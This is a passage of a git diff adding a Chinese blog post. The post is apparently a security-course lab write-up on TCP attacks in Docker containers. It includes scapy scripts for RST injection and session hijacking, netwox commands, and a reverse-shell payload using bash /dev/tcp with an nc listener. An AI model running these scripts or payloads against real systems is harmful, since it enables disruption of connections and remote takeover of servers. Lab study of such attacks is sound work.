+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING RESET PACKET.........&quot;</span>)</span><br><span class="line">ip  = IP(src=<span class="string">&quot;172.17.0.2&quot;</span>, dst=<span class="string">&quot;172.17.0.3&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">23</span>, dport=<span class="number">46412</span>,flags=<span class="string">&quot;R&quot;</span>,seq=<span class="number">3880302867</span>)<span class="comment">#R表示rst报文，seq和分析的报文的ack一致</span></span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)  <span class="comment">#列出报文中每个字段的信息</span></span><br><span class="line">send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用命令<code>python reset_manual.py</code>执行脚本</p>
+<p>结果发现虽然脚本执行成功了，但是wireshark并没有抓到包，于是考虑是不是scapy版本过期了，但是使用<code>apt-get upgrade scapy</code>提示告诉我们scapy已经到达最新版本了。那么就有可能是python的版本低了无法运行高版本的scapy。尝试使用命令<code>python3 reset_manual.py</code>，错误提示为找不到scapy，那么就下载pip3（<code>apt install python3-pip -y</code>）并且用pip3下载scapy。（<code>pip3 install scapy</code>）</p>
+<p>需要注意我这里遇到了下图问题，网上说是pip源太慢了需要换源，于是使用命令<code>mkdir ~/.pip</code> <code>cd ~/.pip</code>创建隐藏文件夹.pip，并使用命令<code>touch pip.conf</code>创建pip.conf文件，在该文件中写入以下内容，保存后就可以使用新的pip源下载scapy了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset7.png"></p>
+<p>使用python3 reset_manual.py执行脚本，成功攻击，客户机的telnet连接被中断，wireshark截获到reset包，并且正是我们构建的对应序列号的RST包。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset8.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset9.png"></p>
+<blockquote>
+<p>后来发现根本不是scapy版本的问题，是我ip地址写错了，用python2的老版scapy也可以完成攻击（只不过会有“没有ipv6”的warning，但是不影响）</p>
+</blockquote>
+</li>
+<li><p><strong>scapy自动攻击</strong></p>
+<p>编写python脚本实现自动攻击，首先使用scapy的sniff函数嗅探到一个tcp连接，使用filter过滤其它的ip端口，仅嗅探从客户端发给服务器23端口的链接。获取嗅探的包中的ack号和端口号等信息，填充进我们新构建的RST包，并发送。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SRC  = <span class="string">&quot;172.17.0.3&quot;</span></span><br><span class="line">DST  = <span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line">PORT = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    old_tcp = pkt[TCP]  <span class="comment">#监听的报文的TCP首部</span></span><br><span class="line">    old_ip  = pkt[IP]   <span class="comment">#监听的报文的IP首部</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    ip  =  IP( src   = old_ip.dst ,  <span class="comment">#old_ip.dst</span></span><br><span class="line">               dst   = old_ip.src    <span class="comment">#old_ip.src</span></span><br><span class="line">             )</span><br><span class="line">    tcp = TCP( sport = old_tcp.dport ,  <span class="comment">#old_tcp.dport</span></span><br><span class="line">               dport = old_tcp.sport ,  <span class="comment">#old_tcp.sport</span></span><br><span class="line">               seq   = old_tcp.ack ,  <span class="comment">#上一个报文的ack</span></span><br><span class="line">               flags = <span class="string">&quot;R&quot;</span></span><br><span class="line">             ) </span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line"></span><br><span class="line">    pkt = ip/tcp</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet: &#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ip.src, ip.dst))</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;tcp and src host &#123;&#125; and dst host &#123;&#125; and dst port &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(SRC, DST, PORT)</span><br><span class="line">sniff(<span class="built_in">filter</span>=f, prn=spoof,iface=<span class="string">&quot;docker0&quot;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>提前打开wireshark和连接好telnet，使用命令<code>python3 reset_auto.py</code>执行脚本，可以看到脚本发送了两个RST包给客户端，并且客户端的telnet连接被中断了。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset10.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset11.png"></p>
+<p>仔细分析wireshark，我们可以看见第86号包是客户机发给服务器的数据包，数据内容是l，这是因为在执行脚本之后，脚本会等待客户发给服务器数据，于是我们输入一个l，这时telnet就会建立tcp连接，将数据l传给服务器，而下一条87号包是服务器回传数据l给客户机，让l可以显示到客户机的屏幕上。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset12.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset13.png"></p>
+<p>第88号包是客户机对服务器刚发过来的报文做的ack回应。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset14.png"></p>
+<p>因此，从脚本开始运行到现在，sniff嗅探到了两个客户机发给服务器的包，分别是l数据包和ack应答包，那么脚本就会发挥它的功能针对这两个包的ack构建RST包，如图所示：</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset15.png"></p>
+</li>
+</ol>
+<h3 id="3-TCP会话劫持攻击"><a href="#3-TCP会话劫持攻击" class="headerlink" title="3.TCP会话劫持攻击"></a>3.TCP会话劫持攻击</h3><p><strong>原理：</strong>通过向会话中注入<strong>恶意内容</strong>来劫持两个受害者之间的现有TCP连接，比如假装用户向服务器发送恶意命令（例如删除文件）</p>
+<p><strong>过程：</strong></p>
+<ol>
+<li><p><strong>netwox攻击</strong></p>
+<p>首先打开wireshark并且连接telnet，因为我们要模拟客户机向服务器发包，所以要找到最后一个由服务器发给客户机的包，如下图中62号包，客户机的端口号是46860，该包的序列号是3346538553（因此我们构造的包发送的ack号应该是3346538554），ack号是2353943332（就是我们构造的包的序列号），window size是227.</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof2.png"></p>
+<p>netwox使用40号工具完成攻击，40号工具的帮助如下：</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof1.png"></p>
+<p>我们用netwox构造指定的sip，dip，sport，dport，并且加上特定的序列号和ack号，还要填充我们的攻击指令进data段。命令如下：</p>
+<p><code>netwox 40 --ip4-src 客户机ip --ip4-dst 服务器ip --tcp-src 客户机端口 --tcp-dst 23（telnet） --tcp-seqnum 伪造的序列号 --tcp-acknum 对应的ack号 --tcp-ack --tcp-window 服务器窗口大小 --tcp-data &quot;6c730d00（ls\r（回车）的16进制）&quot;</code></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof3.png"></p>
+<p>构造的tcp数据包被wireshark截获，数据段为ls\r</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof4.png"></p>
+<p>而服务器对我们构造的恶意指令的响应，一个是69号包对ls指令的回显，另一个是70号包返回给我们客户端当前目录下的内容（即ls的功能）</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof5.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof6.png"></p>
+<p>而后面黑色的部分都是服务器对69号包的重发，因为它服务器的期望收到的序列号已经被我们一次发包增加了几个字节，而telnet一次只会发一个字节，因此客户机发的包始终不满足服务器的要求，会被服务器丢弃，导致服务器一直重发索要正确序列号的包。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof7.png"></p>
+<p><strong>反向shell攻击：</strong>攻击服务器，让服务器向攻击者建立连接。使用bash -i命令让服务器打开bash，但是想要让攻击机能够控制bash的输入输出（比如自己可以看到输出）就要使用bash的重定向。</p>
+<p><code>bash -i &gt; /dev/tcp/ip/port</code>将bash的输出重定向到tcp连接，同时攻击者要打开对对应端口的监听（<code>nc -lvp 4567</code>）。</p>
+<p><code>bash -i &gt; /dev/tcp/ip/port 2&gt;&amp;1</code>将bash输出也重定向到1（标准输出）的输出处，即tcp连接.</p>
+<p><code>bash -i &gt; /dev/tcp/ip/port 2&gt;&amp;1 0&lt;&amp;1</code>将文件描述符0（标准输入）重定向到tcp连接中。（即完成反向shell）</p>
+<p>使用命令 <code>bash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1</code>的ascii码，<code>0a62617368202d69203e2f6465762f7463702f3137322e31372e302e312f3435363720323e263120303c26310a00</code>，将其填充到netwox的data段。客户机再打开一个终端监听4567端口<code>nc -lvp 4567</code></p>
+<p>结果如下，监听的终端获取到了服务器的shell，输入ifconfig可以看到出现的是服务器的ip地址</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof13.png"></p>
+</li>
+<li><p><strong>scapy手动攻击</strong></p>
+<p>和netwox攻击一样，先用wireshark获取相关信息再构建恶意报文。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING SESSION HIJACKING PACKET.........&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip  = IP(src=<span class="string">&quot;172.17.0.3&quot;</span>, dst=<span class="string">&quot;172.17.0.2&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">46876</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">1636165935</span>, ack=<span class="number">494355393</span>)</span><br><span class="line">data = <span class="string">&quot;\n touch /tmp/myfile.txt\n&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">send(pkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们成功发送的报文如图所示</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof8.png">服务器回复的报文如下</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof9.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof10.png"></p>
+<p><strong>反向shell攻击：</strong>和前面一样，只不过把脚本中的data换成字符串”bash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1”，结果如下，成功获取到了服务器的shell。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof14.png"></p>
+</li>
+<li><p><strong>scapy自动攻击</strong></p>
+<p>自动攻击和之前一样，不做赘述，脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SRC  = <span class="string">&quot;172.17.0.2&quot;</span></span><br><span class="line">DST  = <span class="string">&quot;172.17.0.3&quot;</span></span><br><span class="line">PORT = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    old_ip  = pkt[IP]</span><br><span class="line">    old_tcp = pkt[TCP]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line">    ip  =  IP( src   = old_ip.dst,</span><br><span class="line">               dst   = old_ip.src</span><br><span class="line">             )</span><br><span class="line">    tcp = TCP( sport = old_ip.dport,</span><br><span class="line">               dport = old_ip.sport,</span><br><span class="line">               seq   = old_ip.ack,</span><br><span class="line">               ack   = old_ip.seq+<span class="number">1</span>,</span><br><span class="line">               flags = <span class="string">&quot;A&quot;</span></span><br><span class="line">             )</span><br><span class="line">    data = <span class="string">&quot;ls\r&quot;</span></span><br><span class="line">    <span class="comment">#############################################</span></span><br><span class="line"></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>)</span><br><span class="line">    ls(pkt)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;tcp and src host &#123;&#125; and dst host &#123;&#125; and src port &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(SRC, DST, PORT)</span><br><span class="line">sniff(<span class="built_in">filter</span>=f, prn=spoof, iface = <span class="string">&quot;docker0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行攻击之后，脚本开始嗅探从服务器发出的包，因此我们需要在客户端输入一个字母，比如l，让服务器发送l的回显，这样这个回显就会被嗅探到。图中87号包就是服务器的回显。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof11.png"></p>
+<p>那么脚本就会构造91号包来模拟用户机给服务器发包。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof12.png"></p>
+<p><strong>反向shell攻击：</strong>和前面一样，将data填充成攻击的字符串即可。但是需要注意的是，我们的自动脚本需要嗅探到tcp连接才可以构建对应的包，而用户登入telnet后，需要输入字符才会发送tcp报文，而这个输入的字符可能会和bash -i获取shell字符串组成一个字符串而导致服务器识别不到该命令，因此想要成功攻击，需要在bash攻击串前输入\n代表新的指令开始。如：<code>data = &quot;\nbash -i &gt; /dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1\n&quot;</code>结果如图所示</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof15.png"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-id="ckr5o9zzj002qxkur4au9fkru" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li></ul>
+
     </footer>
   </div>
   
@@ -115,23 +1045,49 @@
   
 
 
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/project/page/2/">2</a><a class="page-number" href="/project/page/3/">3</a><a class="extend next" rel="next" href="/project/page/2/">Next &amp;raquo;</a>
+  </nav>
+
 </section>
         
           <aside id="sidebar">
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/project/categories/Git/">Git</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E5%AE%89%E5%8D%93/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a></li><li class="category-list-item"><a class="category-list-link" href="/project/categories/%E9%80%86%E5%90%91/">逆向</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/CV/" rel="tag">CV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/Git/" rel="tag">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/STL/" rel="tag">STL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/TCP/" rel="tag">TCP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/adversarial-patch/" rel="tag">adversarial patch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/db/" rel="tag">db</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/encryption/" rel="tag">encryption</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/gdb/" rel="tag">gdb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/vpn/" rel="tag">vpn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%8E%92%E5%BA%8F/" rel="tag">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%95%A3%E5%88%97/" rel="tag">散列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/project/tags/%E9%80%92%E5%BD%92/" rel="tag">递归</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/project/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/project/tags/C/" style="font-size: 10px;">C++</a> <a href="/project/tags/CV/" style="font-size: 10px;">CV</a> <a href="/project/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/project/tags/Git/" style="font-size: 10px;">Git</a> <a href="/project/tags/STL/" style="font-size: 10px;">STL</a> <a href="/project/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/project/tags/adversarial-patch/" style="font-size: 10px;">adversarial patch</a> <a href="/project/tags/android/" style="font-size: 10px;">android</a> <a href="/project/tags/blog/" style="font-size: 20px;">blog</a> <a href="/project/tags/db/" style="font-size: 10px;">db</a> <a href="/project/tags/dp/" style="font-size: 10px;">dp</a> <a href="/project/tags/encryption/" style="font-size: 10px;">encryption</a> <a href="/project/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/project/tags/linux/" style="font-size: 10px;">linux</a> <a href="/project/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/project/tags/scapy/" style="font-size: 10px;">scapy</a> <a href="/project/tags/vpn/" style="font-size: 10px;">vpn</a> <a href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" style="font-size: 15px;">中国象棋</a> <a href="/project/tags/%E5%88%B7%E9%A2%98/" style="font-size: 10px;">刷题</a> <a href="/project/tags/%E6%8E%92%E5%BA%8F/" style="font-size: 10px;">排序</a> <a href="/project/tags/%E6%95%A3%E5%88%97/" style="font-size: 10px;">散列</a> <a href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/project/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 10px;">流量分析</a> <a href="/project/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 10px;">虚拟机</a> <a href="/project/tags/%E9%80%86%E5%90%91/" style="font-size: 10px;">逆向</a> <a href="/project/tags/%E9%80%92%E5%BD%92/" style="font-size: 10px;">递归</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/project/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -144,7 +1100,23 @@
       <ul>
         
           <li>
-            <a href="/2021/07/16/hello-world/">Hello World</a>
+            <a href="/project/2021/07/16/tmp/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/07/16/hexo%E4%BD%BF%E7%94%A8/">hexo使用</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/19/vpn/">miniVPN实现</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/18/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/">安卓程序加密算法及密钥生成过程分析</a>
+          </li>
+        
+          <li>
+            <a href="/project/2021/05/17/ECCV2020/">Bias-based Universal Adversarial Patch Attack for Automatic Check-out</a>
           </li>
         
       </ul>
@@ -167,9 +1139,13 @@
     </div>
     <nav id="mobile-nav">
   
-    <a href="/" class="mobile-nav-link">Home</a>
+    <a href="/project/" class="mobile-nav-link">Home</a>
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+    <a href="/project/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/project/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/project/tags" class="mobile-nav-link">Tags</a>
   
 </nav>
     
@@ -178,15 +1154,15 @@
 
 
   
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css">
 
   
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
 
 
 
 
-<script src="/js/script.js"></script>
+<script src="/project/js/script.js"></script>
 
 
 
